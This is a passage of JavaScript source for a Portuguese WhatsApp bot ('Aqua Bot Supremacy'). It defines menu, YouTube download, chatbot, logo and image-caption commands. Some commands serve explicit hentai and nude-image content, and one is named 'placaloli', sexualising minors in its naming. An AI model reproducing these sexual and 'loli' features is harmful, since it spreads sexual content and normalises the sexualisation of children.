+ 'END:VCARD'

aqua.sendMessage(sender, { contacts: { displayName: 'LICHT SAN.', contacts: [{ vcard }] } }, { quoted: selo })
break

case 'menu3':
case 'comandos':
case 'help':
sendBimgT(from, `${logo}`, menu(prefix, NomeDoBot), " LEIA COM ATENÇÃO CASO QUEIRA ALUGAR APERTE EM CONTRATE-ME... ",
[{index: 1, urlButton: {displayText: '[💦] 𝗖𝗢𝗠𝗣𝗥𝗔𝗥 𝗕𝗢𝗧 [💧] ', url: 'https://wa.me/553175416530'}},
 {index: 2, urlButton: {displayText: '[💦] 𝗚𝗥𝗨𝗣𝗢 𝗢𝗙𝗜𝗖𝗜𝗔𝗟 [💧]', url: 'https://chat.whatsapp.com/HowVmkSOG3k9kbhdZW2TVj'}},
{index: 5, quickReplyButton: {displayText: '[💦] 𝗠𝗘𝗡𝗨 𝗔𝗗𝗠 [💧]', id: `${prefix}menuadm`}},
{index: 4, quickReplyButton: {displayText: '[💦] 𝗟𝗜𝗦𝗧?? 𝗗𝗘 𝗠𝗘𝗡𝗨𝗦 [💧]', id: `${prefix}lista13`}}, 
{index: 3, quickReplyButton: {displayText: '[💦] 𝗕𝗥𝗜𝗡𝗖𝗔𝗗𝗘𝗜𝗥𝗔𝗦 [💧]', id: `${prefix}brincadeiras`}}], selo)
break

case 'info': //De preferência, Não Altera Nada Aqui tmjt
 case 'ficha':
 case 'fichatecnica':
 aqua.sendMessage(from, { react: { text: `💦`, key: m.key }})
 try {
ppimg = await aqua.profilePictureUrl(`${sender.split('@')[0]}@c.us`, 'image')
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
me = aqua.user
uptime = process.uptime()
teks = `
╭━━━━━◉                                           ◉━━━━━╮
       ╔┉💦┉═══『💧』═══┉💦┉╗    
       ║    ㅤ   ㅤ🇦 🇶 🇺 🇦                ║
       ╚┉💦┉═══『💧』═══┉💦┉╝    
╰━━━━━◉   FICHA TÉCNICA    ◉━━━━━╯
ㅤㅤི⋮ ྀ💧⏝ ི⋮ ྀ  💦 ི⋮ ྀ⏝💧ི⋮ ྀ
ㅤㅤ  ㅤ 
┠➥ *[💦] BOT:* AQUA BOT
┠➥ *[💧] PREFIXO:* ${prefix}
┠➥ *[🔰] VERSÃO:* 3.0
┠➥ *[🛡️] NOME VERSÃO:* SUPREMACY
┠➥ *[👑] CRIADOR:* LICHT SAN
┠➥ *[💸] VALOR:* 80,00
┠➥ *[💙] COMANDOS:* 500+
┠➥ *[🔶] BASE:* MANUELLA V7
┠
┠➥ *[✴️] SITES DE API UTILIZADOS*
┠➥ 🔹https://manuella-api-pl.herokuapp.com
┠➥ 🔹https://api.brizaloka-api.tk
┠➥ 🔹https://tohka.tech
┠
┠➥ *[🌊] CONTRIBUIDORES [🌊]*
┠
┠➥ _[👤] LUIS_
┠➥ _[👤] HALERQUIN_
┠➥ _[👤] SR GUAXINIM_
┠➥ _[👤] AIRES DESIGNER_
┠➥ _[👤] PL 2A.TREM_
┠➥ _[👤] BRENO SAYO_
┠➥ _[👤] YURI MODZ_
╰─╼━━━══━━━≺💧≻━━━══━━━╾─╯`
daftarimgg = await getBuffer(ppimg)
aqua.sendMessage(from, {image: daftarimgg, caption: teks, mentions: [aqua.user.id]})
break

case 'gpofc':
aqua.sendMessage(from, { react: { text: `💦`, key: m.key }})
reply(`https://chat.whatsapp.com/HowVmkSOG3k9kbhdZW2TVj`)
break


case 'gitbot':
image: fs.readFileSync('./mídia-ft-vd/fotos/deusa.jpg'),
                aqua.sendMessage(from, 
                    { text: `𝗔𝗤𝗨𝗔 𝗕𝗢𝗧 𝗦𝗨𝗣𝗥𝗘𝗠𝗔𝗖𝗬 

[💧] 𝗕𝗢𝗧: 
[💧] 𝗕𝗔𝗦𝗘: 
[💧] 𝗜𝗡𝗗𝗘𝗫: 
[💧] 𝗩𝗘𝗥𝗦𝗔̃𝗢: 
[💧] 𝗔𝗥𝗤𝗨𝗜𝗩𝗢: 
[💧] 𝗦𝗨𝗣𝗢𝗥𝗧𝗘 : 
[💧] 𝗖𝗢𝗠𝗔𝗡𝗗𝗢𝗦: 
[💧] 𝗔𝗧𝗨𝗔𝗟𝗜𝗭𝗔𝗗𝗢: `,
                    footer: 'AQUA BOT OFICIAL',
                    templateButtons: [{
                        index: 0,
                        urlButton: {
                            url: 'https://api.whatsapp.com/send/?phone=553175416530&text=𝗢𝗟𝗔́%20𝗣𝗥𝗘𝗖𝗜𝗦𝗢%20𝗗𝗘%20𝗔𝗝𝗨𝗗𝗔%20!&app_absent=0',
                            displayText: '𝗦𝗨𝗣𝗢𝗥𝗧𝗘 𝗢𝗙𝗜𝗖𝗜𝗔𝗟 '
                        }
                    },{
                        index:1,
                        urlButton: {
                            url: 'https://wa.me/556799855355?text=%F0%9D%97%A2%F0%9D%97%B9%F0%9D%97%AE,%20%F0%9D%97%B4%F0%9D%97%BC%F0%9D%98%80%F0%9D%98%81%F0%9D%97%AE%F0%9D%97%BF%F0%9D%97%B6%F0%9D%97%AE%20%F0%9D%97%B1%F0%9D%97%B2%20%F0%9D%98%80%F0%9D%97%AE%F0%9D%97%AF%F0%9D%97%B2%F0%9D%97%BF%20%F0%9D%97%BA%F0%9D%97%AE%F0%9D%97%B6%F0%9D%98%80%20%F0%9D%97%B6%F0%9D%97%BB%F0%9D%97%B3%F0%9D%97%BC%F0%9D%97%BF%F0%9D%97%BA%F0%9D%97%AE%F0%9D%97%B0%F0%9D%97%BC%F0%9D%97%B2%F0%9D%98%80%20%F0%9D%98%80%F0%9D%97%BC%F0%9D%97%AF%F0%9D%97%BF%F0%9D%97%B2%20%F0%9D%97%AE%20%F0%9D%97%94%F0%9D%97%BE%F0%9D%98%82%F0%9D%97%AE%20%F0%9D%97%95%F0%9D%97%BC%F0%9D%98%81,%20%F0%9D%97%AE%F0%9D%98%80%F0%9D%98%80%F0%9D%97%B6%F0%9D%97%BA%20%F0%9D%97%B0%F0%9D%97%BC%F0%9D%97%BA%F0%9D%97%BC%20%F0%9D%98%83%F0%9D%97%AE%F0%9D%97%B9',
                            displayText: '𝗦𝗨𝗣𝗢𝗥𝗧𝗘 𝗢𝗙𝗜𝗖𝗜𝗔𝗟 2'
                        }
                        }, {
                                quickReplyButton: {
                                    displayText: '[💧] 𝗧𝗘𝗥𝗠𝗨𝗫 119 [💧] ',
                                    id: `${prefix}termux119`
                                }  
                                }, {
                                quickReplyButton: {
                                    displayText: '[💧] 𝗚𝗜𝗧 𝗔𝗤𝗨𝗔 𝗕𝗢𝗧 [💧] ',
                                    id: `${prefix}aqua22`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '[💧] 𝗠𝗘𝗡𝗨 𝗣𝗥𝗜𝗡𝗖𝗜𝗣𝗔𝗟  [💧]',
                                    id: `${prefix}menu`
                                }
                    }]
                })
break

case 'list':
case 'menu2':
case 'help':
case '?':
case 'menulist':
aqua.sendMessage(from, { react: { text: `💦`, key: m.key }})
 {
timestampe = speed();
latensie = speed() - timestampe
uptime = process.uptime()
adivinhaa = info.key.id.length > 21 ? 'Android 🥴' : info.key.id.substring(0, 2) == '3A' ? 'IPHONE 🔋🔌' : 'ZAP DA WEB 💻';
sections = [
{
title: "[💦] AQUA BOT SUPREMACY [💦] ",
rows: [
{title: "[💦] MENU BRINCADEIRAS [💦]", rowId: `${prefix}brincadeiras`},
{title: "[??] MENU ALTERADORES [💦]", rowId: `${prefix}alteradores`},
{title: "[💦] MENU COMPLETO [💦]", rowId: `${prefix}menu`},
{title: "[💦] MENU PREMIUM [💦]", rowId: `${prefix} menupremium`},
{title: "[💦] INFORMAÇÕES [💦]", rowId: `${prefix}info`},
{title: "[💦] MENU HENTAI [💦]", rowId: `${prefix}menuhentai`},
{title: "[💦] HENTAI LIST [💦]", rowId: `${prefix}hentalist`},
{title: "[💦] MENU LOGO [💦]", rowId: `${prefix}menulogos`},
{title: "[💦] MENU DONO [💦]", rowId: `${prefix}menudono`},
{title: "[💦] MENU ADM [💦]", rowId: `${prefix}menuadm`},
{title: "[💦] INFO DONO [💦]", rowId: `${prefix}infodono`},
{title: "[💦] GP OFICIAL [💦]", rowId: `${prefix}gpofc`},
{title: "[💦] COMPRAR [💦]", rowId: `${prefix}alugar`},
{title: "[💦] CRIADOR [💦]", rowId: `${prefix}dono`}
]
},
]
 

const listMessage2 = {
text: `
╭━━━━━◉                                       ◉━━━━━╮
       ╔┉💦┉═══『💧』═══┉💦┉╗    
       ║    ㅤ   ㅤ🇲 🇪 🇳 🇺               ║
       ╚┉💦┉═══『💧』═══┉💦┉╝    
╰━━━━━◉                                       ◉━━━━━╯
ㅤㅤི⋮ ྀ💧⏝ ི⋮ ྀ  💦 ི⋮ ྀ⏝💧ི⋮ ྀ
ㅤㅤ  ㅤ 
┠➥ *[👤] OLÁ HUMANO:* ${pushname} 
┠➥ *[⚖️]* ${tempo} 😊
┠➥ *[🟢] ATIVA:* ${runtime(uptime)}
┠➥ *[⚡] PING:* ${latensie.toFixed(4)}
┠➥ *[⏱️] HORA:* ${time}
┠➥ *[📆] DATA:* ${date}
┠➥ *[💬] CHAT:* ${!isGroup ? `${pushname}` :  `${groupName}`}
┠➥ *[📲] CELULAR:* ${adivinhaa}
┠➥ *[📳] NÚMERO:* ${sender.split("@")[0]}
┠➥ *[💦] BOT:* AQUA BOT SUPREMACY
┠➥ *[👑] DONO:* LICHT SAN
┠➥ *[📌] CHAT DONO:* wa.me/${global.numerodonoa}
╰─╼━━━══━━━≺??≻━━━══━━━╾─╯`,
  footer: `➥@Licht.Offc\n➥@AquaBot.Wpp`,
  title: ``,
  buttonText: "[💦] MENU LIST [💦]",
  sections
}
sendMsg = await aqua.sendMessage(from, listMessage2, {quoted: selo})
}
break

case 'store': 
case 'menustore':
aqua.sendMessage(from, { react: { text: `💦`, key: m.key }})
{
timestampe = speed();
latensie = speed() - timestampe
uptime = process.uptime()
adivinhaa = info.key.id.length > 21 ? 'Android 🥴' : info.key.id.substring(0, 2) == '3A' ? 'IPHONE 🔋🔌' : 'ZAP DA WEB 💻';
sections = [
{
title: "[💦] AQUA BOT SUPREMACY [💦] ",
rows: [
{title: "[💦] WHATSAPP IMUNE [💦]", rowId: `${prefix}imune`},
{title: "[💦] WHATSAPP IMUNE [💦]", rowId: `${prefix}imune2`}
]
},
]
 

const listMessage2 = {
text: `
╭━━━━━◉                                       ◉━━━━━╮
       ╔┉💦┉═══『💧』═══┉💦┉╗    
       ║    ㅤ   ㅤ🇲 🇪 🇳 🇺               ║
       ╚┉💦┉═══『💧』═══┉💦┉╝    
╰━━━━━◉                                       ◉━━━━━╯
ㅤㅤི⋮ ྀ💧⏝ ི⋮ ྀ  💦 ི⋮ ྀ⏝💧ི⋮ ྀ
ㅤㅤ  ㅤ 
┠➥ *[👤] OLÁ HUMANO:* ${pushname} 
┠➥ *[⚖️]* ${tempo} 😊
┠➥ *[🟢] ATIVA:* ${runtime(uptime)}
┠➥ *[⚡] PING:* ${latensie.toFixed(4)}
┠➥ *[⏱️] HORA:* ${time}
┠➥ *[📆] DATA:* ${date}
┠➥ *[💬] CHAT:* ${!isGroup ? `${pushname}` :  `${groupName}`}
┠➥ *[📲] CELULAR:* ${adivinhaa}
┠➥ *[📳] NÚMERO:* ${sender.split("@")[0]}
┠➥ *[💦] BOT:* AQUA BOT SUPREMACY
┠➥ *[👑] DONO:* LICHT SAN
┠➥ *[📌] CHAT DONO:* wa.me/${global.numerodonoa}
╰─╼━━━══━━━≺💧≻━━━══━━━╾─╯`,
  footer: `➥@Licht.Offc\n➥@AquaBot.Wpp`,
  title: ``,
  buttonText: "[💦] MENU LIST [💦]",
  sections
}
sendMsg = await aqua.sendMessage(from, listMessage2, {quoted: selo})
}
break

case 'hentailist':
case 'listhentai':
aqua.sendMessage(from, { react: { text: `💦`, key: m.key }})
 {
timestampe = speed();
latensie = speed() - timestampe
uptime = process.uptime()
adivinhaa = info.key.id.length > 21 ? 'Android 🥴' : info.key.id.substring(0, 2) == '3A' ? 'IPHONE 🔋🔌' : 'ZAP DA WEB 💻';
sections = [
{
title: "[💦] AQUA BOT SUPREMACY [💦] ",
rows: [
{title: "[💦] AHEGAO ", rowId: `${prefix}ahegao`},
{title: "[💦] ASS ", rowId: `${prefix}ass`},
{title: "[💦] DBSM ", rowId: `${prefix}bdsm`},
{title: "[💦] BLOWJOB ", rowId: `${prefix}blowjob`},
{title: "[💦] CUCKOLD ", rowId: `${prefix}cuckold`},
{title: "[💦] CUM ", rowId: `${prefix}cum`},
{title: "[💦] ERO ", rowId: `${prefix}ero`},
{title: "[💦] FOOT ", rowId: `${prefix}foot`},
{title: "[💦] FEMDOM ", rowId: `${prefix}femdom`},
{title: "[💦] GLASSES ", rowId: `${prefix}glasses`},
{title: "[💦] HENTAIVIDEO ", rowId: `${prefix}hentai3`},
{title: "[💦] HENTAIGIF ", rowId: `${prefix}hentai2`},
{title: "[💦] HENTAI ", rowId: `${prefix}hentai`},
{title: "[💦] ORGY ", rowId: `${prefix}orgy`},
{title: "[💦] JAHY ", rowId: `${prefix}jahy`},
{title: "[💦] NEKO ", rowId: `${prefix}neko`},
{title: "[💦] THIGHS ", rowId: `${prefix}thighs`},
{title: "[💦] YURI ", rowId: `${prefix}yuri`},
{title: "[💦] TENTACLES ", rowId: `${prefix}tentacles`}
]
},
]
 

const listMessage2 = {
text: `
╭━━━━━◉                                       ◉━━━━━╮
       ╔┉💦┉═══『💧』═══┉💦┉╗    
       ║    ㅤ   ㅤ🇲 🇪 🇳 🇺               ║
       ╚┉💦┉═══『💧』═══┉💦┉╝    
╰━━━━━◉                                       ◉━━━━━╯
ㅤㅤི⋮ ྀ💧⏝ ི⋮ ྀ  💦 ི⋮ ྀ⏝💧ི⋮ ྀ
ㅤㅤ  ㅤ 
┠➥ *[👤] Olá* ${pushname}
┠➥ *[🗣️] Aqui Tenho as Melhores Api de Hentai*
┠➥ *[👥] Escolha um Da Lista e Seja Feliz*
╰─╼━━━══━━━≺💧≻━━━══━━━╾─╯`,
  footer: `➥@Licht.Offc\n➥@AquaBot.Wpp`,
  title: ``,
  buttonText: "[💦] HENTAI LIST [💦]",
  sections
}
sendMsg = await aqua.sendMessage(from, listMessage2, {quoted: selo})
}
break

 


case 'destrava':
aqua.sendMessage(from, { react: { text: `💦`, key: m.key }})
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
await aqua.sendMessage(from, {text: destrava(prefix)}, {quoted: selo})
break 


case 'subir': case 'limpar': // Subir o chat - Clear
aqua.sendMessage(from, { react: { text: `💦`, key: m.key }})
if (!isGroupAdmins) return enviar ('🖐️só quem tem pau grande pode usar esse comando !')
aqua.sendMessage(from, {text: '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n'}, {quoted: selo})
aqua.sendMessage(from, {text: '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n'}, {quoted: selo})
break

//========FINAL DOS MENU=============



//=======MÚSICAS=============

case 'play':
aqua.sendMessage(from, { react: { text: `💦`, key: m.key }})
if (args.length < 1) return reply(`Exemplo:\n${command} mc poze`)
srch = args.join(" ")
ytbusca = await yts(srch);
ytbr = ytbusca.all
res = await yts(srch)
var link = ytbr[0].url
sections = []
ytbr.splice(10, ytbr.length)
ytlink = ytbr.url
ytbr.forEach((ytbr, i) =>{
sections.push({
rows: [ {
description: `${ytbr.title}`,
title: `[🎶] ÁUDIO | [⌛] DURAÇÃO: ${ytbr.timestamp}`,
rowId: `${prefix}ytmp3 ${ytbr.url}`},
{description: `${ytbr.title}`,
title: `[📹] VÍDEO| [⌛] DURAÇÃO: ${ytbr.timestamp}`,
rowId: `${prefix}ytmp4 ${ytbr.url}`} ],
title: `AQUA BOT SUPREMACY`
})
}) 
aqua.sendMessage(from, {text: `[💦] RESULTADO DA BUSCA [💦]\n@Licht.offc\n@aquabot.wpp`,title: `${NomeDoBot}`,buttonText: "[🎶] LIST PLAT [🎶]", sections}, { quoted:info})
break

case 'play2':
aqua.sendMessage(from, { react: { text: `💦`, key: m.key }})
if(!q) return reply(`Cade o nome?`)
sendMsg = await aqua.sendMessage(from, {react: {text: `⏳`, key: info.key}})
qp = args.join(" ")
res = await yts(qp)
blaimg = await getBuffer(res.all[0].image)
blalink = await getBuffer(res.all[0].url)
bla = `
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
      ⟮ _*◉ʏᴏᴜᴛᴜʙᴇ◉*_ ⟯ 
   
0.02━◉━━━━━━━━━━━━3.26
      🔂   ⏪   ⏸️     ⏩  🎵
      
📌 Titulo: ${res.all[0].title}
📈 Visualizações: ${res.all[0].views}
👀 Duração: ${res.all[0].timestamp}
🔎 Canal: ${res.all[0].author.name}
🗯 Link ${res.all[0].url}`
buttons02 = [
{buttonId: `${prefix}ytmp3 ${res.all[0].url}`, buttonText: {displayText: `[🎶] MÚSICA [🎶]`}, type: 1},
{buttonId: `${prefix}ytmp4 ${res.all[0].url}`, buttonText: {displayText: `[📹] VÍDEO [📹]`}, type: 1},
{buttonId: `${prefix}ytdoc ${res.all[0].url}`,  buttonText: {displayText: `[📂] DOCUMENTO [📂]`}, type: 1}
]
buttonMessage02 = {
image: await getBuffer(res.all[0].image),
sendEphemeral: true,
jpegThumbnail: await getBuffer(res.all[0].thumbnail),
mentions: [sender],
caption: bla,
 footer: `Aperte no botão abaixo para enviar a música`,
buttons: buttons02,
headerType: 4,
contextInfo:{forwardingScore:999, isForwarded:true}
}
aqua.sendMessage(from, buttonMessage02)
break

case 'ytmp3':
case 'ytaudio':
case 'ytmp34':
aqua.sendMessage(from, { react: { text: `🎶`, key: m.key }})
                try{
                    if(args.length < 1) return reply('CADE O LINK ANIMAL')
                    if(!args[0]) return reply('❌ Isso não é um link do youtube ❌')
                    anumusic = await new Youtube().ytmp3(args[0])
                    buff = await getBuffer(anumusic.dl_link)
                    ran = getRandom('.mp3')
                    reply('[💧]  Estou Baixando [💧]')
                    await aqua.sendMessage(from, {audio: buff, mimetype: 'audio/mpeg', contextInfo: {externalAdReply : {title : `AQUA BOT SUPREMACY `, renderLargerThumbnail:false, showAdAttribution: true, body: `9:07●━━━━━━── 10:49⇆`, mediaUrl: `${q}`, mediaType: 2, thumbnail: fs.readFileSync('./mídia-ft-vd/fotos/deusa.jpg') }}}, {quoted: selo})
                } catch(e) {
                    console.log(e)
                    reply('Error')
                }
                break



case 'ytdoc':
aqua.sendMessage(from, { react: { text: `💦`, key: m.key }})
try {
sendMsg = await aqua.sendMessage(from, {react: {text: `⏳`, key: info.key}})
anumusic = await new Youtube().ytmp3(args[0])
buff = await getBuffer(anumusic.dl_link)
ran = getRandom('.mp3')
docmedia = {
document: {url: anumusic.dl_link },
mimetype: 'audio/mpeg',
jpegThumbnail: await getBuffer(anumusic.thumb),
fileName: anumusic.title+'.mp3',
headerType: 4,
mentions: [sender],
contextInfo:{forwardingScore:999, isForwarded:true}
}
aqua.sendMessage(from, docmedia, {quoted: selo})
} catch {
reply('Ocorreu em erro, tente novamente após alguns minutos.')
}
break



case 'ytmp4': case 'ytvideo': 
sendMsg = await aqua.sendMessage(from, {react: {text: `📹`, key: info.key}})
  try{
                let { ytv } = require('./funções/y2mate')
                if(args.length < 1) return reply('CADE O LINK ANIMAL')
                if(!args[0]) return reply('Isso Não É Link do Youtube')
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(text, quality)
                reply('[💧] Relaxa, Já To Baixando [💧]')
                aqua.sendMessage(from, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `AQUA BOT SUPREMACY` }, { quoted: selo })
                                } catch(e) {
                    console.log(e)
                    reply('Desculpe, Função Desativada')
                }
            break


//========FINAL DAS MÚSICAS=============

//=(CASE-SIMIH-INTELIGÊNCIA-ARTIFICIAL)=\\

case 'aqua':
if(isSimi) return reply('Desativado')
sduy = args.join(" ")
data = await fetchJson(`https://api.simsimi.net/v2/?text=${sduy}&lc=pt`, {method: 'get'})
simi = `${data.success}`  
reply(simi)
break

case 'aqua1':
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isSimi) return reply('O modo Simi está ativo')
samih.push(from)
fs.writeFileSync('./funções de cmd/usuarios/simi.json', JSON.stringify(samih))
reply('Ativado com sucesso o modo simi neste grupo 😗')
} else if (Number(args[0]) === 0) {
if(!isSimi) return reply('Já está Desativado.')
samih.splice(from, 1)
fs.writeFileSync('./funções de cmd/usuarios/simi.json', JSON.stringify(samih))
reply('Desativado modo simi com sucesso neste grupo 😡️')
} else {
reply('1 para ativar, 0 para desativar, lerdao vc em')
}
break

case 'aqua2':
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isSimi2) return reply('O modo Simi está ativo')
samih2.push(from)
fs.writeFileSync('./funções de cmd/funções/simi.json', JSON.stringify(samih2))
reply('Ativado com sucesso o modo simi neste grupo 😗, Este simih2 ele aprende as respostas e perguntas das pessoas, conforme vai falando, por isso, só recomendo utilizar ele no termux, pois no site ou lugar diferente do termux que você utilizar, ele não vai armazenar os dados nescessarios')
} else if (Number(args[0]) === 0) {
if(!isSimi2) return reply('Já está Desativado.')
samih2.splice(from, 1)
fs.writeFileSync('./funções de cmd/funções/simi.json', JSON.stringify(samih2))
reply('Desativado modo simi com sucesso neste grupo 😡️')
} else {
reply('1 para ativar, 0 para desativar, lerdao vc em')
}
break

//========================================\\


//==========(PLAQUINHAS-LOGOS)===========\\

case 'plaq':
if (!isNsfw) return reply(`É necessário que o comando seja ativado por um adm\nExemplo: ${prefix}nsfw 1`)
if (args.length < 1) return reply(`${prefix}plaq e digite o seu nome`)
teks = body.slice(6)
if (teks.length > 15) return reply('O texto é longo, até 15 caracteres') //maximo de caracteres
reply(enviar.espere) //mensagem
buffer = await getBuffer(`https://raptibef.sirv.com/images%20(3).jpeg?text.0.text=${teks}&text.0.position.gravity=center&text.0.position.x=19%25&text.0.size=45&text.0.color=000000&text.0.opacity=55&text.0.font.family=Crimson%20Text&text.0.font.weight=300&text.0.font.style=italic&text.0.outline.opacity=21`)
aqua.sendMessage(from, {image: buffer, sendEphemeral: true, thumbnail: null, caption: ' *Plaquinha feita ✓* '}, {quoted: selo})
break

case 'plaq2':
if (!isNsfw) return reply(`É necessário que o comando seja ativado por um adm\nExemplo: ${prefix}nsfw 1`)
if (args.length < 1) return reply(`${prefix}plaq2 e digite o seu nome`)
teks = body.slice(7)
if (teks.length > 15) return reply('O texto é longo, até 15 caracteres') //maximo de caracteres
reply(enviar.espere) //mensagem
buffer = await getBuffer(`https://raptibef.sirv.com/images%20(1).jpeg?profile=Zanga%202.0&text.0.text=${teks}`)
aqua.sendMessage(from, {image: buffer, sendEphemeral: true, thumbnail: null, caption: ' *Plaquinha feita ✓* '}, {quoted: selo})
break

case 'plaq3':
if (!isNsfw) return reply(`É necessário que o comando seja ativado por um adm\nExemplo: ${prefix}nsfw 1`)
if (args.length < 1) return reply(`${prefix}plaq3 e digite o seu nome`)
teks = body.slice(7)
if (teks.length > 15) return reply('O texto é longo, até 15 caracteres') //maximo de caracteres
reply(enviar.espere) //mensagem
buffer = await getBuffer(`https://raptibef.sirv.com/images.jpeg?profile=Zanga%203.0&text.0.text=${teks}&text.0.outline.blur=63`)
aqua.sendMessage(from, {image: buffer, sendEphemeral: true, thumbnail: null, caption: ' *Plaquinha feita ✓* '}, {quoted: selo})
break

case 'plaq4':
if (!isNsfw) return reply(`É necessário que o comando seja ativado por um adm\nExemplo: ${prefix}nsfw 1`) 
if (args.length < 1) return reply(`${prefix}plaq7 e digite o seu nome`)
teks = body.slice(7)
if (teks.length > 10) return reply('O texto é longo, até 10 caracteres') //maximo de caracteres
reply(enviar.espere) //mensagem
buffer = await getBuffer(`https://umethroo.sirv.com/Torcedora-da-sele%C3%A7%C3%A3o-brasileira-nua-mostrando-a-bunda-236x300.jpg?text.0.text=${teks}&text.0.position.x=-64%25&text.0.position.y=-39%25&text.0.size=25&text.0.color=1b1a1a&text.0.font.family=Architects%20Daughter`) //api
plaq = ` *Plaquinha feita ✓* `
aqua.sendMessage(from, {image: buffer, sendEphemeral: true, thumbnail: null, caption: ' *Plaquinha feita ✓* '}, {quoted: selo})
break

case 'plaq5':
if (!isNsfw) return reply(`É necessário que o comando seja ativado por um adm\nExemplo: ${prefix}nsfw 1`)
if (args.length < 1) return reply(`${prefix}plaq10 e digite o seu nome`)
teks = body.slice(7)
if (teks.length > 15) return reply('O texto é longo, até 15 caracteres') //maximo de caracteres
reply(enviar.espere) //mensagem
buffer = await getBuffer(`https://umethroo.sirv.com/peito1.jpg?text.0.text=${teks}&text.0.position.x=-4%25&text.0.position.y=-6%25&text.0.size=14&text.0.color=000000&text.0.font.family=Shadows%20Into%20Light&text.0.font.weight=700`)
aqua.sendMessage(from, {image: buffer, sendEphemeral: true, thumbnail: null, caption: ' *Plaquinha feita ✓* '}, {quoted: selo})
break
case 'plaq4off':
if (!isNsfw) return reply(`É necessário que o comando seja ativado por um adm\nExemplo: ${prefix}nsfw 1`)
if (args.length < 1) return reply(`${prefix}plaq4 e digite o seu nome`)
teks = body.slice(7)
if (teks.length > 15) return reply('O texto é longo, até 15 caracteres') //maximo de caracteres
reply(enviar.espere) //mensagem
buffer = await getBuffer(`https://raptibef.sirv.com/images%20(2).jpeg?profile=Zanga%204.0&text.0.text=${teks}`)
aqua.sendMessage(from, {image: buffer, sendEphemeral: true, thumbnail: null, caption: ' *Plaquinha feita ✓* '}, {quoted: selo})
break

case 'placaloli':
if (!q) return reply(enviar.wrongFormat)
reply('Aguarde..')
lod = await fetchJson(`https://nekobot.xyz/api/imagegen?type=kannagen&text=${q}`)
sendStickerFromUrl(from, lod.message, enviar.success)
await limitAdd(sender)
break 

//=======================================\\


// LOGOS 

case 'shadow':
case 'angelwing':
case 'efeitoneon':
case 'cemiterio':
case 'metalgold':
case 'narutologo':
case 'fire':
case 'romantic':
case 'smoke':  
case 'papel':
case 'lovemsg':
case 'lovemsg2':
case 'lovemsg3':
case 'coffecup':
case 'coffecup2':  
case 'cup':
case 'florwooden':
case 'madeira':
case 'neon2':
case 'lobometal':
case 'harryp':
case 'txtborboleta':
case 'blackpink':
case 'girlmascote': 
case 'logogame':
case 'equipemascote':
case 'fpsmascote':
case 'hackneon':
case 'ffavatar':
case 'mascotegame':
case 'wingeffect':
case 'angelglx':
case 'gizquadro':
case 'txtquadrinhos':
try {
textin = args.join(" ")
if(!textin) return reply("Cade o texto?")
reply(enviar.espere)
bla = await fetchJson(`https://manuella-api-pl.herokuapp.com/api/${command}?texto=${textin}&apikey=${keyapi}`)
blabla = await getBuffer(bla.resultado.imageUrl)
aqua.sendMessage(from, {image: blabla}, {quoted: selo}).catch(rs =>{
reply("ERROR!!")  
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
} else {
reply('ERROR!!')
}
}
break  

case 'gameplay':
case 'ffbanner':
case 'mascoteavatar':  
try {
textin = args.join(" ")
txt1 = textin.split("/")[0];
txt2 = textin.split("/")[1];
if(!textin) return reply("Cade o texto?")
if(!textin.includes("/")) return reply(`Cade a / precisa dela para a separação..\nExemplo: ${prefix + command} Game/Play`)
reply(enviar.espere)
bla = await fetchJson(`https://manuella-api-pl.herokuapp.com/api/${command}?texto=${txt1}&texto2=${txt2}&apikey=${keyapi}`)
blabla = await getBuffer(bla.resultado.imageUrl)
aqua.sendMessage(from, {image: blabla}, {quoted: selo}).catch(rs =>{
reply("ERROR!!")  
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
} else {
reply('ERROR!!')
}
}
break

case 'googlesg':
try {
textin = args.join(" ")
txt1 = textin.split("/")[0];
